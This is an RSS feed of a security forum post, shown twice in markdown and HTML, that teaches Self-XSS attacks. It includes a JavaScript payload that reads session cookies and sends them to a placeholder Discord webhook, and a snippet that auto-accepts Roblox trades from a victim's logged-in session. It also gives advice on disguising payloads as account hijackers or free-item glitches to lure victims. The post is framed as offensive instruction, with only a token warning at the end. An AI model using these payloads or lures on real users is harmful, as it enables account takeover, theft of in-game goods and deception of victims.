<?xml version="1.0" encoding="UTF-8" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:dc="http://purl.org/dc/elements/1.1/">
  <channel>
    <title>Self XSS, The Epitome of Social Engineering</title>
    <link>https://0x00sec.org/t/self-xss-the-epitome-of-social-engineering/32043</link>
    <description># Introductions

Some time ago I came across a popular Roblox scam, a screenshot is shown below:
![:skull:](upload://wjDGRmhr1EJA75OAhq4Cm7AYrvB.png)
This is a popular case of Self-XSS, where a user pretty much compromises themselves. Sadly the rblxapi.pro domain has been burned, so we cannot analyze the payload being run by this little stager. What we *can* do however is write out own malicious payloads. :grimacing: 

# Self XSS as a lucrative attack 

Self-XSS has the same exact benefits of other XSS vectors such as reflected XSS. These benefits include:

* CSRF bypassing 

* Arbitrary code execution

The only issue with Self-XSS is the fact that it is not reliant on a vulnerable webpage, it&#39;s reliant on a vulnerable *person*.

## Manipulation tactics

As we know, nobody is just going to paste **anything** in their terminal or search bar unless they have a reason to. Your payload could pose as an account hijacker, or some free item glitch, etc. It all depends on who you are looking to exploit. The most popular *&quot;hack&quot;* Self-XSS takes for in is __Account Hijacking__.

![FaceBook Self-XSS](upload://eRRqzxP6L07YTefy9yhV2S0ZR7g.png)

As Seen in [this Facebook help page](https://www.facebook.com/help/246962205475854), Users run a malicious payload manually thinking it can hijack other accounts. The truth is, they are the ones hijacked.

# Building our own payloads

We will be building a simple Self-XSS payload for the following test application (Written in PHP):
```php
&lt;?php
session_start();
$id = session_id();

echo &quot;&lt;h1&gt;Current Session ID: $id&lt;/h1&gt;&quot;;

// run php -S localhost:8080
?&gt;
```

Creating 2 different sessions (by opening multiple browser instances, one in incognito and another not), you will get greeted with this:
![PHP Session Example](upload://s0aGh6LaY5B6kaZc9sYcXe501wu.png)

## Exploitation 

We can now create our malicious payload, all we need to do is grab the `PHPSESSID` cookie from `document.cookies` and send a fetch request to our exfiltration destination (a Discord webhook, in this case). Payload below:

```javascript
let session = document.cookie.split(&quot;; &quot;)[1];

fetch(
 &quot;&#39;WEBHOOK_LINK&quot;,
  {
    method: &quot;post&quot;,
    headers: {
      &quot;Content-Type&quot;: &quot;application/json&quot;,
    },
    body: JSON.stringify({
      username: &#39;scary 1337 haxor &gt;:)&#39;,
      content: &quot;**`&quot; + session + &quot;`**&quot;
    })
  }
);
```
Running this is our victims browser, their `PHPSESSID` will be hooked, and we will now have access to their account.

# Going further

This is already, enough but lets say we want to attack an actual web application [Roblox](https://roblox.com) for instance. Well, there&#39;s a few flaws in our current payload.

- The .ROBLOSECURITY cookie is flagged as HTTPOnly
- CORS Prevents us from exfiltrating data.

What we *can* do though, is make requests from `roblox.com` to their APIs, which are hosted on their subdomains. This bypasses the Cross Origin Policy due to the requests coming from `roblox.com`. 

## Accepting Arbitrary Trades

```javascript
let tradeId = &quot;ID&quot;;

$.ajax({
  method: &quot;POST&quot;,
  url: `https://trades.roblox.com/v1/trades/${tradeId}/accept`,
  contentType: &quot;application/json&quot;
}).then(
  data =&gt; console.log(data)
).fail(
  error =&gt; console.log(error.responseJSON.errors[0].message)
);
```

&gt; Running this on an authorized victims account accepts a trade automatically.

# Fin

&lt;3 Don&#39;t fall for Self-XSS :skull:</description>
    
    <lastBuildDate>Tue, 08 Nov 2022 20:31:20 +0000</lastBuildDate>
    <category>Social Engineering</category>
    <atom:link href="https://0x00sec.org/t/self-xss-the-epitome-of-social-engineering/32043.rss" rel="self" type="application/rss+xml" />
      <item>
        <title>Self XSS, The Epitome of Social Engineering</title>
        <dc:creator><![CDATA[system]]></dc:creator>
        <description><![CDATA[
            <p>This topic was automatically closed after 121 days. New replies are no longer allowed.</p>
          <p><a href="https://0x00sec.org/t/self-xss-the-epitome-of-social-engineering/32043/2">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/self-xss-the-epitome-of-social-engineering/32043/2</link>
        <pubDate>Fri, 10 Mar 2023 12:29:17 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-32043-2</guid>
        <source url="https://0x00sec.org/t/self-xss-the-epitome-of-social-engineering/32043.rss">Self XSS, The Epitome of Social Engineering</source>
      </item>
      <item>
        <title>Self XSS, The Epitome of Social Engineering</title>
        <dc:creator><![CDATA[camel]]></dc:creator>
        <description><![CDATA[
            <h1>
<a name="introductions-1" class="anchor" href="https://0x00sec.org#introductions-1"></a>Introductions</h1>
<p>Some time ago I came across a popular Roblox scam, a screenshot is shown below:<br>
</p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/e/2/e27deb982f9f11c9925a08a93625184cd2346313.png" data-download-href="/uploads/short-url/wjDGRmhr1EJA75OAhq4Cm7AYrvB.png?dl=1" title=":skull:" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/optimized/3X/e/2/e27deb982f9f11c9925a08a93625184cd2346313_2_690x195.png" alt=":skull:" data-base62-sha1="wjDGRmhr1EJA75OAhq4Cm7AYrvB" width="690" height="195" srcset="https://0x00sec.s3.amazonaws.com/optimized/3X/e/2/e27deb982f9f11c9925a08a93625184cd2346313_2_690x195.png, https://0x00sec.s3.amazonaws.com/original/3X/e/2/e27deb982f9f11c9925a08a93625184cd2346313.png 1.5x, https://0x00sec.s3.amazonaws.com/original/3X/e/2/e27deb982f9f11c9925a08a93625184cd2346313.png 2x" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/3X/e/2/e27deb982f9f11c9925a08a93625184cd2346313_2_10x10.png"></a></div><br>
This is a popular case of Self-XSS, where a user pretty much compromises themselves. Sadly the rblxapi.pro domain has been burned, so we cannot analyze the payload being run by this little stager. What we <em>can</em> do however is write out own malicious payloads. <img src="https://0x00sec.org/images/emoji/twitter/grimacing.png?v=12" title=":grimacing:" class="emoji" alt=":grimacing:" loading="lazy" width="20" height="20"><p></p>
<h1>
<a name="self-xss-as-a-lucrative-attack-2" class="anchor" href="https://0x00sec.org#self-xss-as-a-lucrative-attack-2"></a>Self XSS as a lucrative attack</h1>
<p>Self-XSS has the same exact benefits of other XSS vectors such as reflected XSS. These benefits include:</p>
<ul>
<li>
<p>CSRF bypassing</p>
</li>
<li>
<p>Arbitrary code execution</p>
</li>
</ul>
<p>The only issue with Self-XSS is the fact that it is not reliant on a vulnerable webpage, it’s reliant on a vulnerable <em>person</em>.</p>
<h2>
<a name="manipulation-tactics-3" class="anchor" href="https://0x00sec.org#manipulation-tactics-3"></a>Manipulation tactics</h2>
<p>As we know, nobody is just going to paste <strong>anything</strong> in their terminal or search bar unless they have a reason to. Your payload could pose as an account hijacker, or some free item glitch, etc. It all depends on who you are looking to exploit. The most popular <em>“hack”</em> Self-XSS takes for in is <strong>Account Hijacking</strong>.</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/6/8/68351a404dbd221a622367077120dfa163e8e8ee.png" data-download-href="/uploads/short-url/eRRqzxP6L07YTefy9yhV2S0ZR7g.png?dl=1" title="FaceBook Self-XSS" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/optimized/3X/6/8/68351a404dbd221a622367077120dfa163e8e8ee_2_690x331.png" alt="FaceBook Self-XSS" data-base62-sha1="eRRqzxP6L07YTefy9yhV2S0ZR7g" width="690" height="331" srcset="https://0x00sec.s3.amazonaws.com/optimized/3X/6/8/68351a404dbd221a622367077120dfa163e8e8ee_2_690x331.png, https://0x00sec.s3.amazonaws.com/original/3X/6/8/68351a404dbd221a622367077120dfa163e8e8ee.png 1.5x, https://0x00sec.s3.amazonaws.com/original/3X/6/8/68351a404dbd221a622367077120dfa163e8e8ee.png 2x" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/3X/6/8/68351a404dbd221a622367077120dfa163e8e8ee_2_10x10.png"></a></div><p></p>
<p>As Seen in <a href="https://www.facebook.com/help/246962205475854" rel="noopener nofollow ugc">this Facebook help page</a>, Users run a malicious payload manually thinking it can hijack other accounts. The truth is, they are the ones hijacked.</p>
<h1>
<a name="building-our-own-payloads-4" class="anchor" href="https://0x00sec.org#building-our-own-payloads-4"></a>Building our own payloads</h1>
<p>We will be building a simple Self-XSS payload for the following test application (Written in PHP):</p>
<pre><code class="lang-php">&lt;?php
session_start();
$id = session_id();

echo "&lt;h1&gt;Current Session ID: $id&lt;/h1&gt;";

// run php -S localhost:8080
?&gt;
</code></pre>
<p>Creating 2 different sessions (by opening multiple browser instances, one in incognito and another not), you will get greeted with this:<br>
<img src="https://0x00sec.s3.amazonaws.com/original/3X/c/4/c441db5ae1e5b2da9fc61047c358bb2ea8e31632.png" alt="PHP Session Example" data-base62-sha1="s0aGh6LaY5B6kaZc9sYcXe501wu" width="622" height="261"></p>
<h2>
<a name="exploitation-5" class="anchor" href="https://0x00sec.org#exploitation-5"></a>Exploitation</h2>
<p>We can now create our malicious payload, all we need to do is grab the <code>PHPSESSID</code> cookie from <code>document.cookies</code> and send a fetch request to our exfiltration destination (a Discord webhook, in this case). Payload below:</p>
<pre><code class="lang-javascript">let session = document.cookie.split("; ")[1];

fetch(
 "'WEBHOOK_LINK",
  {
    method: "post",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify({
      username: 'scary 1337 haxor &gt;:)',
      content: "**`" + session + "`**"
    })
  }
);
</code></pre>
<p>Running this is our victims browser, their <code>PHPSESSID</code> will be hooked, and we will now have access to their account.</p>
<h1>
<a name="going-further-6" class="anchor" href="https://0x00sec.org#going-further-6"></a>Going further</h1>
<p>This is already, enough but lets say we want to attack an actual web application <a href="https://roblox.com" rel="noopener nofollow ugc">Roblox</a> for instance. Well, there’s a few flaws in our current payload.</p>
<ul>
<li>The .ROBLOSECURITY cookie is flagged as HTTPOnly</li>
<li>CORS Prevents us from exfiltrating data.</li>
</ul>
<p>What we <em>can</em> do though, is make requests from <code>roblox.com</code> to their APIs, which are hosted on their subdomains. This bypasses the Cross Origin Policy due to the requests coming from <code>roblox.com</code>.</p>
<h2>
<a name="accepting-arbitrary-trades-7" class="anchor" href="https://0x00sec.org#accepting-arbitrary-trades-7"></a>Accepting Arbitrary Trades</h2>
<pre><code class="lang-javascript">let tradeId = "ID";

$.ajax({
  method: "POST",
  url: `https://trades.roblox.com/v1/trades/${tradeId}/accept`,
  contentType: "application/json"
}).then(
  data =&gt; console.log(data)
).fail(
  error =&gt; console.log(error.responseJSON.errors[0].message)
);
</code></pre>
<blockquote>
<p>Running this on an authorized victims account accepts a trade automatically.</p>
</blockquote>
<h1>
<a name="fin-8" class="anchor" href="https://0x00sec.org#fin-8"></a>Fin</h1>
<p>&lt;3 Don’t fall for Self-XSS <img src="https://0x00sec.org/images/emoji/twitter/skull.png?v=12" title=":skull:" class="emoji" alt=":skull:" loading="lazy" width="20" height="20"></p>
          <p><a href="https://0x00sec.org/t/self-xss-the-epitome-of-social-engineering/32043/1">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/self-xss-the-epitome-of-social-engineering/32043/1</link>
        <pubDate>Tue, 08 Nov 2022 20:29:10 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-32043-1</guid>
        <source url="https://0x00sec.org/t/self-xss-the-epitome-of-social-engineering/32043.rss">Self XSS, The Epitome of Social Engineering</source>
      </item>
  </channel>
</rss>
